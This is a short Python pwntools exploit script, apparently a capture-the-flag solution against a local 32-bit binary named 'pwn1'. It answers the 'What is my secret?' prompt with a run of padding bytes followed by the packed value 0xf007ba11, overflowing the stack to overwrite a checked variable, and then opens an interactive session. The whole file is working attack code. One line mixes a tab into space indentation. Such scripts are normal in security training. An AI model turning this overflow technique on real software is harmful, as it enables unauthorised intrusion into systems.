#!/usr/bin/env python

from pwn import *
import os
import sys

context.arch = 'i386'
context.log_level = 'debug'

io = process('./pwn1') 

packer = make_packer(32, endian='little', sign='unsigned')
unpacker = make_unpacker(32, endian='little', sign='unsigned')

def exploit():
    try:
        io.recvuntil('What is my secret?')
        io.send('A' * (0x23-0xc))
	io.sendline(packer(0xf007ba11))
        io.interactive()

    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    exploit()
